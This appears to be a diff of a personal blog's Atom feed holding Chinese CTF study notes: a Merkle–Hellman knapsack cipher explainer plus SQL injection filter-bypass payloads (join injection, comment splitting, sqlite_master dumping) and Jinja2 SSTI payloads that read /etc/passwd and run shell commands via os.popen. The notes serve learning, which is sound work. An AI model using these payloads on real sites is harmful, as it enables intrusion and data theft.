@@ -6,7 +6,7 @@
   <link href="https://smileless-l.github.io/atom.xml" rel="self"/>
   
   <link href="https://smileless-l.github.io/"/>
-  <updated>2026-03-26T13:13:25.396Z</updated>
+  <updated>2026-04-21T09:42:28.432Z</updated>
   <id>https://smileless-l.github.io/</id>
   
   <author>
@@ -21,9 +21,9 @@
     <link href="https://smileless-l.github.io/2026/03/26/%E8%83%8C%E5%8C%85%E5%AF%86%E7%A0%81%E7%AE%80%E8%AE%B0/"/>
     <id>https://smileless-l.github.io/2026/03/26/%E8%83%8C%E5%8C%85%E5%AF%86%E7%A0%81%E7%AE%80%E8%AE%B0/</id>
     <published>2026-03-26T13:13:00.000Z</published>
-    <updated>2026-03-26T13:13:25.396Z</updated>
+    <updated>2026-04-21T09:42:28.432Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="背包密码简记"><a href="#背包密码简记" class="headerlink" title="背包密码简记"></a>背包密码简记</h1><p>标签（空格分隔）： 背包密码</p><hr><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>假如一个背包 W 满足以下</p><center> $W=a_1*x_1+a_2*x_2+a_3*x_3+...+a_ix_i$</center><p>&amp;emsp;其中$a_1,a_2,…a_i$是货物，$x_1,x_2,…,x_i$都只等于0或者1，x相当于决定是否装货物。式子表示而当货物装载的量等于 W 的时候。<br>&amp;emsp;此时很显然，如果我们知道$a_1,a_2,…,a_i$的时候要逆推回去W的话可能要重复$2^i$次（$x_i$只可能等于1&#x2F;2）<br>&amp;emsp;此时如果我们要对一个密文m进行加密的话可以将m转化为对应的二进制的数值然后再用对应的$a_i$进行赋值，但是此时有一个缺点：解密的人自己也不好解密<br>&amp;emsp;但是当a是超增值的话就有办法来解了。超增值即那边只有以下条件</p><center>$a_i>\sum_{k=1}^{i-1}a_k$</center><p>&amp;emsp;为什么满足这样的条件就可以解密了呢？这是因为如果加密后的结果大于$a_n$的话，其前面的系数为必须1的。反之，无论如何也无法使得等式成立。因此，我们可以立马得到对应的明文。<br>&amp;emsp;但是，这样又出现了一个问题，由于$a_i$是公开的，如果攻击者截获了密文，那么它也就很容易去破解这样的密码。为了弥补这样的问题，就出现了Merkle–Hellman这样的加密算法，我们可以使用初始的背包集作为私钥，变换后的背包集作为公钥，再稍微改动加密过程，即可。</p><hr><h2 id="Merkle–Hellman"><a href="#Merkle–Hellman" class="headerlink" title="Merkle–Hellman"></a>Merkle–Hellman</h2><h3 id="生成私钥"><a href="#生成私钥" class="headerlink" title="生成私钥"></a>生成私钥</h3><p>私钥就是我们的初始的背包集，这里我们使用超递增序列，怎么生成呢？我们可以假设$a_1&#x3D;1$，那么$a_2$大于 1 即可，类似的可以依次生成后面的值。</p><h3 id="生成公钥"><a href="#生成公钥" class="headerlink" title="生成公钥"></a>生成公钥</h3><p>在生成公匙的过程中运用了模乘的运算，先是生成一个m，m必须满足</p><center>$m>\sum_{1}^{i}a_i$</center><p>选择一个模乘的模数m满足</p><center>$gcd(m,w)=1$</center><p>之后再生成公匙$b_i&#x3D;w*a_i \ mod \ m$,最后将$b_i$和$m$作为公匙</p><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><p>假设要加密的密文为v，每一个比特位对应的是$v_i$<br>直接$W &#x3D;  \sum_{1}^ib_i*v_i \ mod \ m $</p><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>因为$W &#x3D; \sum_{1}^{i}b_i<em>v_{i}$，那么$W * w^{-1} \ mod \ m &#x3D; \sum_1^ia_i</em>v_i \ mod \ m$<br>由于m是大于$\sum_1^ia_i*v_i$的所以可以直接解。</p><p>本文写到这里但是背包密码在提出后两年便被破解了，后续小编将写出破解的笔记</p>]]></content>
+    <content type="html"><![CDATA[<h1 id="背包密码简记"><a href="#背包密码简记" class="headerlink" title="背包密码简记"></a>背包密码简记</h1><p>标签（空格分隔）： 背包密码</p><hr><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>假如一个背包 W 满足以下</p><center> $W=a_1*x_1+a_2*x_2+a_3*x_3+...+a_ix_i$</center><p>&amp;emsp;其中$a_1,a_2,…a_i$是货物，$x_1,x_2,…,x_i$都只等于0或者1，x相当于决定是否装货物。式子表示而当货物装载的量等于 W 的时候。<br>&amp;emsp;此时很显然，如果我们知道$a_1,a_2,…,a_i$的时候要逆推回去W的话可能要重复$2^i$次（$x_i$只可能等于1&#x2F;2）<br>&amp;emsp;此时如果我们要对一个密文m进行加密的话可以将m转化为对应的二进制的数值然后再用对应的$a_i$进行赋值，但是此时有一个缺点：解密的人自己也不好解密<br>&amp;emsp;但是当a是超增值的话就有办法来解了。超增值即那边只有以下条件</p><center>$a_i>\sum_{k=1}^{i-1}a_k$</center><p>&amp;emsp;为什么满足这样的条件就可以解密了呢？这是因为如果加密后的结果大于$a_n$的话，其前面的系数为必须1的。反之，无论如何也无法使得等式成立。因此，我们可以立马得到对应的明文。<br>&amp;emsp;但是，这样又出现了一个问题，由于$a_i$是公开的，如果攻击者截获了密文，那么它也就很容易去破解这样的密码。为了弥补这样的问题，就出现了Merkle–Hellman这样的加密算法，我们可以使用初始的背包集作为私钥，变换后的背包集作为公钥，再稍微改动加密过程，即可。</p><hr><h2 id="Merkle–Hellman"><a href="#Merkle–Hellman" class="headerlink" title="Merkle–Hellman"></a>Merkle–Hellman</h2><h3 id="生成私钥"><a href="#生成私钥" class="headerlink" title="生成私钥"></a>生成私钥</h3><p>私钥就是我们的初始的背包集，这里我们使用超递增序列，怎么生成呢？我们可以假设$a_1&#x3D;1$，那么$a_2$大于 1 即可，类似的可以依次生成后面的值。</p><h3 id="生成公钥"><a href="#生成公钥" class="headerlink" title="生成公钥"></a>生成公钥</h3><p>在生成公匙的过程中运用了模乘的运算，先是生成一个m，m必须满足</p><center>$m>\sum_{1}^{i}a_i$</center><p>选择一个模乘的模数m满足</p><center>$gcd(m,w)=1$</center><p>之后再生成公匙$b_i&#x3D;w*a_i \ mod \ m$,最后将$b_i$和$m$作为公匙</p><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><p>假设要加密的密文为v，每一个比特位对应的是$v_i$<br>直接$W &#x3D;  \sum_{1}^ib_i*v_i \ mod \ m $</p><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>因为$W &#x3D; sum_{1}^{i}b_i<em>v_{i}$，<br>那么$W * w^{-1}  mod  m &#x3D; \sum_1^ia_i</em>v_i  mod  m$<br>由于m是大于$sum_1^ia_i*v_i$的所以可以直接解。</p><p>本文写到这里但是背包密码在提出后两年便被破解了，后续小编将写出破解的笔记</p>]]></content>
     
     
       
@@ -327,32 +327,6 @@ MathJax = {
   </entry>
   
   <entry>
-    <title>SQLite</title>
-    <link href="https://smileless-l.github.io/2026/01/28/SQLite/"/>
-    <id>https://smileless-l.github.io/2026/01/28/SQLite/</id>
-    <published>2026-01-28T13:45:00.000Z</published>
-    <updated>2026-02-06T17:00:08.341Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h1><hr><p>join注入：当，被过滤的时候可以使用该方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SELECT *</span><br><span class="line">FROM users</span><br><span class="line">UNION</span><br><span class="line">SELECT *</span><br><span class="line">FROM (</span><br><span class="line">(SELECT 1) A</span><br><span class="line">JOIN (SELECT 2) B</span><br><span class="line">JOIN (SELECT 3) C</span><br><span class="line">JOIN (SELECT 4) D</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>此时空格被过滤的化可以使用%0a（URL编译）和%09（水平换行）<br>见<a href="https://blog.csdn.net/qq_61778128/article/details/123205490">https://blog.csdn.net/qq_61778128/article/details/123205490</a></p><p>sqlite注入查表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">union</span><br><span class="line">select*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTnameFROMsqlite_master)d</span><br><span class="line">join(selectSELECTsqlFROMsqlite_master)f</span><br></pre></td></tr></table></figure><p>找到后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">unionselect*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTconfig_keyFROMsys_config)d</span><br><span class="line">join(SELECTconfig_valueFROMsys_config)f`</span><br></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;SQLite&quot;&gt;&lt;a href=&quot;#SQLite&quot; class=&quot;headerlink&quot; title=&quot;SQLite&quot;&gt;&lt;/a&gt;SQLite&lt;/h1&gt;&lt;hr&gt;
-&lt;p&gt;join注入：当，被过滤的时候可以使用该方法&lt;/p&gt;
-&lt;figure class=&quot;highlig</summary>
-      
-    
-    
-    
-    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
-    
-    
-    <category term="SQL" scheme="https://smileless-l.github.io/tags/SQL/"/>
-    
-  </entry>
-  
-  <entry>
     <title>SQL&#39;select&#39;绕过</title>
     <link href="https://smileless-l.github.io/2026/01/28/SQL&#39;select&#39;%E7%BB%95%E8%BF%87/"/>
     <id>https://smileless-l.github.io/2026/01/28/SQL&#39;select&#39;%E7%BB%95%E8%BF%87/</id>
@@ -367,6 +341,32 @@ MathJax = {
     <summary type="html">&lt;h1 id=&quot;SQL’select’绕过&quot;&gt;&lt;a href=&quot;#SQL’select’绕过&quot; class=&quot;headerlink&quot; title=&quot;SQL’select’绕过&quot;&gt;&lt;/a&gt;SQL’select’绕过&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： SQL绕过&lt;/p&gt;
 &lt;hr&gt;
 &lt;</summary>
+      
+    
+    
+    
+    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
+    
+    
+    <category term="SQL绕过" scheme="https://smileless-l.github.io/tags/SQL%E7%BB%95%E8%BF%87/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>SQL&quot;,&quot;号绕过</title>
+    <link href="https://smileless-l.github.io/2026/01/28/SQL_,_%E5%8F%B7%E7%BB%95%E8%BF%87/"/>
+    <id>https://smileless-l.github.io/2026/01/28/SQL_,_%E5%8F%B7%E7%BB%95%E8%BF%87/</id>
+    <published>2026-01-28T13:45:00.000Z</published>
+    <updated>2026-02-06T17:04:54.362Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="SQL”-”号绕过"><a href="#SQL”-”号绕过" class="headerlink" title="SQL”,”号绕过"></a>SQL”,”号绕过</h1><p>标签（空格分隔）： SQL绕过</p><hr><p>join注入：当，被过滤的时候可以使用该方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SELECT *</span><br><span class="line">FROM users</span><br><span class="line">UNION</span><br><span class="line">SELECT *</span><br><span class="line">FROM (</span><br><span class="line">(SELECT 1) A</span><br><span class="line">JOIN (SELECT 2) B</span><br><span class="line">JOIN (SELECT 3) C</span><br><span class="line">JOIN (SELECT 4) D</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>此时空格被过滤的化可以使用%0a（URL编译）和%09（水平换行）<br>见<a href="https://blog.csdn.net/qq_61778128/article/details/123205490">https://blog.csdn.net/qq_61778128/article/details/123205490</a></p><p>sqlite注入查表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">union</span><br><span class="line">select*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTnameFROMsqlite_master)d</span><br><span class="line">join(selectSELECTsqlFROMsqlite_master)f</span><br></pre></td></tr></table></figure><p>找到后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">unionselect*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTconfig_keyFROMsys_config)d</span><br><span class="line">join(SELECTconfig_valueFROMsys_config)f`</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;SQL”-”号绕过&quot;&gt;&lt;a href=&quot;#SQL”-”号绕过&quot; class=&quot;headerlink&quot; title=&quot;SQL”,”号绕过&quot;&gt;&lt;/a&gt;SQL”,”号绕过&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： SQL绕过&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;join注入：当，被过滤的时</summary>
       
     
     
@@ -405,20 +405,46 @@ MathJax = {
   </entry>
   
   <entry>
-    <title>SQL&quot;,&quot;号绕过</title>
-    <link href="https://smileless-l.github.io/2026/01/28/SQL_,_%E5%8F%B7%E7%BB%95%E8%BF%87/"/>
-    <id>https://smileless-l.github.io/2026/01/28/SQL_,_%E5%8F%B7%E7%BB%95%E8%BF%87/</id>
+    <title>SQLite</title>
+    <link href="https://smileless-l.github.io/2026/01/28/SQLite/"/>
+    <id>https://smileless-l.github.io/2026/01/28/SQLite/</id>
     <published>2026-01-28T13:45:00.000Z</published>
-    <updated>2026-02-06T17:04:54.362Z</updated>
+    <updated>2026-02-06T17:00:08.341Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="SQL”-”号绕过"><a href="#SQL”-”号绕过" class="headerlink" title="SQL”,”号绕过"></a>SQL”,”号绕过</h1><p>标签（空格分隔）： SQL绕过</p><hr><p>join注入：当，被过滤的时候可以使用该方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SELECT *</span><br><span class="line">FROM users</span><br><span class="line">UNION</span><br><span class="line">SELECT *</span><br><span class="line">FROM (</span><br><span class="line">(SELECT 1) A</span><br><span class="line">JOIN (SELECT 2) B</span><br><span class="line">JOIN (SELECT 3) C</span><br><span class="line">JOIN (SELECT 4) D</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>此时空格被过滤的化可以使用%0a（URL编译）和%09（水平换行）<br>见<a href="https://blog.csdn.net/qq_61778128/article/details/123205490">https://blog.csdn.net/qq_61778128/article/details/123205490</a></p><p>sqlite注入查表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">union</span><br><span class="line">select*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTnameFROMsqlite_master)d</span><br><span class="line">join(selectSELECTsqlFROMsqlite_master)f</span><br></pre></td></tr></table></figure><p>找到后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">unionselect*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTconfig_keyFROMsys_config)d</span><br><span class="line">join(SELECTconfig_valueFROMsys_config)f`</span><br></pre></td></tr></table></figure>]]></content>
+    <content type="html"><![CDATA[<h1 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h1><hr><p>join注入：当，被过滤的时候可以使用该方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SELECT *</span><br><span class="line">FROM users</span><br><span class="line">UNION</span><br><span class="line">SELECT *</span><br><span class="line">FROM (</span><br><span class="line">(SELECT 1) A</span><br><span class="line">JOIN (SELECT 2) B</span><br><span class="line">JOIN (SELECT 3) C</span><br><span class="line">JOIN (SELECT 4) D</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>此时空格被过滤的化可以使用%0a（URL编译）和%09（水平换行）<br>见<a href="https://blog.csdn.net/qq_61778128/article/details/123205490">https://blog.csdn.net/qq_61778128/article/details/123205490</a></p><p>sqlite注入查表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">union</span><br><span class="line">select*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTnameFROMsqlite_master)d</span><br><span class="line">join(selectSELECTsqlFROMsqlite_master)f</span><br></pre></td></tr></table></figure><p>找到后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">unionselect*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTconfig_keyFROMsys_config)d</span><br><span class="line">join(SELECTconfig_valueFROMsys_config)f`</span><br></pre></td></tr></table></figure>]]></content>
     
     
       
       
-    <summary type="html">&lt;h1 id=&quot;SQL”-”号绕过&quot;&gt;&lt;a href=&quot;#SQL”-”号绕过&quot; class=&quot;headerlink&quot; title=&quot;SQL”,”号绕过&quot;&gt;&lt;/a&gt;SQL”,”号绕过&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： SQL绕过&lt;/p&gt;
+    <summary type="html">&lt;h1 id=&quot;SQLite&quot;&gt;&lt;a href=&quot;#SQLite&quot; class=&quot;headerlink&quot; title=&quot;SQLite&quot;&gt;&lt;/a&gt;SQLite&lt;/h1&gt;&lt;hr&gt;
+&lt;p&gt;join注入：当，被过滤的时候可以使用该方法&lt;/p&gt;
+&lt;figure class=&quot;highlig</summary>
+      
+    
+    
+    
+    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
+    
+    
+    <category term="SQL" scheme="https://smileless-l.github.io/tags/SQL/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>SQL空格绕过</title>
+    <link href="https://smileless-l.github.io/2026/01/28/SQL%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/"/>
+    <id>https://smileless-l.github.io/2026/01/28/SQL%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/</id>
+    <published>2026-01-28T13:45:00.000Z</published>
+    <updated>2026-02-06T17:05:40.978Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="SQL空格绕过"><a href="#SQL空格绕过" class="headerlink" title="SQL空格绕过"></a>SQL空格绕过</h1><p>标签（空格分隔）： SQL绕过</p><hr><p>##内联绕过<br>首先是空格被过滤了可以使用内联绕过具体使用例子如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原始语句：</span><br><span class="line">UNION SELECT 1,2,3</span><br><span class="line"></span><br><span class="line">绕过方式：</span><br><span class="line">UNI/*任意内容*/ON SEL/*注释*/ECT 1,2,3</span><br></pre></td></tr></table></figure><p>这样就可以绕过了</p><hr>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;SQL空格绕过&quot;&gt;&lt;a href=&quot;#SQL空格绕过&quot; class=&quot;headerlink&quot; title=&quot;SQL空格绕过&quot;&gt;&lt;/a&gt;SQL空格绕过&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： SQL绕过&lt;/p&gt;
 &lt;hr&gt;
-&lt;p&gt;join注入：当，被过滤的时</summary>
+&lt;p&gt;##内联绕过&lt;br&gt;首先是空格被过滤了可以使</summary>
       
     
     
@@ -455,6 +481,32 @@ MathJax = {
   </entry>
   
   <entry>
+    <title>SSTI简记</title>
+    <link href="https://smileless-l.github.io/2026/01/28/SSTI%E7%AE%80%E8%AE%B0/"/>
+    <id>https://smileless-l.github.io/2026/01/28/SSTI%E7%AE%80%E8%AE%B0/</id>
+    <published>2026-01-28T13:45:00.000Z</published>
+    <updated>2026-02-06T17:01:54.618Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="SSTI简记"><a href="#SSTI简记" class="headerlink" title="SSTI简记"></a>SSTI简记</h1><p>标签（空格分隔）： ssti</p><hr><h2 id="识别模板引擎"><a href="#识别模板引擎" class="headerlink" title="##识别模板引擎##"></a>##识别模板引擎##<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125; → 49 (成功)     # Jinja2, Twig</span><br><span class="line">$&#123;7*7&#125; → 49 (成功)      # FreeMarker</span><br><span class="line">&lt;%= 7*7 %&gt; → 49 (成功)  # ERB, Ruby</span><br><span class="line">#&#123;7*7&#125; → 49 (成功)      # Jade/Pug</span><br></pre></td></tr></table></figure></h2><p>###基础知识类###</p><table><thead><tr><th>组件</th><th>作用</th></tr></thead><tbody><tr><td>‘’</td><td>一个具体的对象</td></tr><tr><td><strong>class</strong></td><td>查看这个对象的类</td></tr><tr><td><strong>mro</strong></td><td>查看类的继承关系</td></tr><tr><td><strong>mro</strong>[1]</td><td>获取基类（object）</td></tr><tr><td><strong>subclasses</strong>()</td><td>获取所有子类</td></tr></tbody></table><hr><p>###沙盒逃逸(Jinjia2&#x2F;Flask)###</p><p>####A基础对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__&#125;&#125;  # 获取字符串类</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__&#125;&#125;  # 方法解析顺序</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()&#125;&#125;  # 所有子类</span><br></pre></td></tr></table></figure><p>####B寻找危险类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查找file类</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>file类只能是大概在40左右具体的得通过不断的尝试来获取,然后直接查。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查找os模块</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>os模块可以直接调用命令来进行比如system(‘ls’)之类的</p><p><code>大概位置如下</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Python 2常见索引</span><br><span class="line"># 常见的危险类索引</span><br><span class="line">file类: 索引40左右</span><br><span class="line">subprocess.Popen: 索引258左右</span><br><span class="line">os._wrap_close: 索引132左右（在socket模块中）</span><br><span class="line"></span><br><span class="line"># Python 3常见索引</span><br><span class="line">_io.TextIOWrapper: 索引4左右（用于文件操作）</span><br><span class="line">subprocess.Popen: 索引289左右</span><br><span class="line">os._wrap_close: 索引132左右（最常用！）</span><br></pre></td></tr></table></figure><p><code>常见的payload如下</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># RCE示例</span><br><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__[&#x27;sys&#x27;].modules[&#x27;os&#x27;].popen(&#x27;id&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;request.application.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;SSTI简记&quot;&gt;&lt;a href=&quot;#SSTI简记&quot; class=&quot;headerlink&quot; title=&quot;SSTI简记&quot;&gt;&lt;/a&gt;SSTI简记&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： ssti&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&quot;识别模板引擎&quot;&gt;&lt;a href=&quot;#识别模板</summary>
+      
+    
+    
+    
+    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
+    
+    
+    <category term="SSTI" scheme="https://smileless-l.github.io/tags/SSTI/"/>
+    
+  </entry>
+  
+  <entry>
     <title>gopher_协议使用</title>
     <link href="https://smileless-l.github.io/2026/01/28/gopher___%E5%8D%8F%E8%AE%AE%E4%BD%BF%E7%94%A8/"/>
     <id>https://smileless-l.github.io/2026/01/28/gopher___%E5%8D%8F%E8%AE%AE%E4%BD%BF%E7%94%A8/</id>
@@ -475,58 +527,6 @@ MathJax = {
     
     
     <category term="SSRF" scheme="https://smileless-l.github.io/tags/SSRF/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>SQL空格绕过</title>
-    <link href="https://smileless-l.github.io/2026/01/28/SQL%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/"/>
-    <id>https://smileless-l.github.io/2026/01/28/SQL%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/</id>
-    <published>2026-01-28T13:45:00.000Z</published>
-    <updated>2026-02-06T17:05:40.978Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="SQL空格绕过"><a href="#SQL空格绕过" class="headerlink" title="SQL空格绕过"></a>SQL空格绕过</h1><p>标签（空格分隔）： SQL绕过</p><hr><p>##内联绕过<br>首先是空格被过滤了可以使用内联绕过具体使用例子如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原始语句：</span><br><span class="line">UNION SELECT 1,2,3</span><br><span class="line"></span><br><span class="line">绕过方式：</span><br><span class="line">UNI/*任意内容*/ON SEL/*注释*/ECT 1,2,3</span><br></pre></td></tr></table></figure><p>这样就可以绕过了</p><hr>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;SQL空格绕过&quot;&gt;&lt;a href=&quot;#SQL空格绕过&quot; class=&quot;headerlink&quot; title=&quot;SQL空格绕过&quot;&gt;&lt;/a&gt;SQL空格绕过&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： SQL绕过&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;##内联绕过&lt;br&gt;首先是空格被过滤了可以使</summary>
-      
-    
-    
-    
-    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
-    
-    
